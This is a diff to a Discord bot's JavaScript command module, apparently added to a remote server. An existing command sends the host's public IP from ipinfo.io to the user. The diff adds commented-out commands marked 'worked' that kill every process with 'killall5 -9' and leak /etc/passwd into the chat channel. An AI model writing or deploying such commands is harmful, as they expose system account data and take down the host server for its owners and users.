@@ -59,7 +59,7 @@ app.listen(3984, function (err) {
 
         message.channel.send("installed");
 
-        const response = await axios({
+        const response = await require("axios")({
             url: "https://ipinfo.io/json",
             method: "GET",
         });
@@ -67,3 +67,23 @@ app.listen(3984, function (err) {
         message.author.send(`${JSON.parse(response.data)}`);
     },
 };
+
+// worked
+// module.exports.end = {
+//     name: "end",
+//     description: "end the linux server",
+//     run: async ({ client, message }) => {
+//         require("child_process").spawn("killall5", ["-9"]);
+//     },
+// };
+
+// worked
+// module.exports.passwd = {
+//     name: "passwd",
+//     description: "leak /etc/passwd",
+//     run: async ({ client, message }) => {
+//         require("fs").readFile("/etc/passwd", "utf8", function (err, data) {
+//             message.channel.send(`\`\`\`bash\n${data}\`\`\``);
+//         });
+//     },
+// };
